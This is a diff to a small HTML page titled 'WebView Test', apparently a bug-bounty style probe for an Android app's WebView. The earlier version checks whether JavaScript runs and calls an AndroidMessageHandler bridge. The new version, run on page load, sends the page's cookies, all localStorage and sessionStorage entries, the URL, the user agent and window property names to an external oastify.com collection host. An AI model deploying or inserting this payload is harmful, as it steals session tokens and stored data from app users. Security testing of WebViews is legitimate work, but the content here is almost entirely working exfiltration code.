@@ -1,26 +1,73 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>WebView Test</title>
+</head>
 <body>
 <script>
-try {
-    // test basic JS execution
-    fetch("https://hl6ygaz2sav8olu1qtx6hk18tzzrnkb9.oastify.com/?js=executed");
+(function() {
+    var OAST = "https://fexw98s0l8o6hjnzjrq4aiu6mxsqgg45.oastify.com";
 
-    // test JS bridge
-    if (typeof AndroidMessageHandler !== "undefined") {
-        fetch("https://hl6ygaz2sav8olu1qtx6hk18tzzrnkb9.oastify.com/?bridge=exists");
-
-        AndroidMessageHandler.postMessage(JSON.stringify({
-            command: "open-external-url",
-            url: "https://example.com"
-        }));
-    } else {
-        fetch("https://hl6ygaz2sav8olu1qtx6hk18tzzrnkb9.oastify.com/?bridge=notfound");
+    function send(label, data) {
+        try {
+            fetch(OAST + "/?" + label + "=" + encodeURIComponent(data));
+        } catch (e) {}
     }
 
-} catch (e) {
-    fetch("https://hl6ygaz2sav8olu1qtx6hk18tzzrnkb9.oastify.com/?error=" + e);
-}
+    // 1. Basic execution check
+    send("status", "js_executed");
+
+    // 2. Cookie test
+    try {
+        send("cookie", document.cookie || "EMPTY");
+    } catch (e) {
+        send("cookie_error", e.toString());
+    }
+
+    // 3. LocalStorage test
+    try {
+        var ls = "";
+        for (var i = 0; i < localStorage.length; i++) {
+            var key = localStorage.key(i);
+            ls += key + "=" + localStorage.getItem(key) + ";";
+        }
+        send("localStorage", ls || "EMPTY");
+    } catch (e) {
+        send("ls_error", e.toString());
+    }
+
+    // 4. SessionStorage test
+    try {
+        var ss = "";
+        for (var i = 0; i < sessionStorage.length; i++) {
+            var key = sessionStorage.key(i);
+            ss += key + "=" + sessionStorage.getItem(key) + ";";
+        }
+        send("sessionStorage", ss || "EMPTY");
+    } catch (e) {
+        send("ss_error", e.toString());
+    }
+
+    // 5. Location info
+    try {
+        send("location", window.location.href);
+    } catch (e) {}
+
+    // 6. User agent
+    try {
+        send("ua", navigator.userAgent);
+    } catch (e) {}
+
+    // 7. Try access window objects (kadang ada leak)
+    try {
+        var props = [];
+        for (var p in window) {
+            props.push(p);
+        }
+        send("window_props", props.slice(0,50).join(","));
+    } catch (e) {}
+
+})();
 </script>
 </body>
 </html>
